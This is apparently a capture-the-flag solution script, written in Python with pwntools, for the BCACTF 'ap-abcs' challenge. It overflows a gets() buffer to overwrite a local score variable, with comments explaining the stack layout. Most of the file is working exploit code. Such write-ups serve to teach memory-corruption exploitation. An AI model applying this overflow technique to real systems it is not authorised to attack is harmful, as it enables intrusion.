from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./ap-abcs')

e = ELF('./ap-abcs')

## Read until the prompt
p.readuntil('1: ')

'''
gets() reads until it encounters a newline which allows you to overflow the 50-byte response buffer.
Here is the stack layout

response        {Frame offset -0x58}        This is the buffer that we fill
character       {Frame offset -0x1c}
FILE *          {Frame offset -0x18}
gets_result     {Frame offset -0x10}
score           {Frame offset -0x0c}        We want to overwrite this so that score = 0x73434241
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
One thing to be careful of. The overwrite occurs during the call to the gets() function. If your string
starts with an 'a' then the score variable will be overwritten which you don't want. So start
with any other character.
'''

## add enough bytes to reach score 0x58 - 0xc
response = b'b'*(0x58 - 0xc)

# The next bytes overflow score.
response += struct.pack('I', 0x73434241)

p.send(response + b'\n')

p.readuntil('policies:')
p.readline()
flag = p.readline()

print('Flag: ', flag)

p.close()

